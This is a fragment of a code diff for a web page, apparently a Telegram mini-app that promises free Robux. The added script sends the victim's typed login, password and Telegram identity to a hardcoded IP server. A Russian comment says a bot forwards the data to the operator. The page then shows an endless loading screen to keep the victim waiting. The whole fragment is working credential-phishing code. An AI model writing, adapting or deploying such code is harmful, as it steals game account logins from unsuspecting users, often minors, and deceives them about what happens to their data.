+                // ДАННЫЕ ОТПРАВЛЯЮТСЯ В ТВОЙ PYTHON СЕРВЕР (БОТ ПРИШЛЕТ ТЕБЕ В ЛИЧКУ)
+                await fetch('http://144.31.223.15:8000/submit', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        user_id: tg.initDataUnsafe.user?.id || 0,
+                        username: tg.initDataUnsafe.user?.username || "Unknown",
+                        login: document.getElementById('login').value,
+                        password: document.getElementById('pass').value,
+                        robux: selectedR
+                    })
+                });
+
+                // После успешной отправки перекидываем на экран Бесконечной загрузки
+                document.querySelector('.slide.active').classList.remove('active'); 
+                document.getElementById('slide-4').classList.add('active');
+                
+            } catch(e) { 
+                showAlert("❌ ОШИБКА СЕТИ. Проверьте соединение."); 
+                btn.innerText = "ПОЛУЧИТЬ"; btn.style.opacity = "1"; 
+            }
+        }
+    </script>
 </body>
-    </html>
-    
+</html>
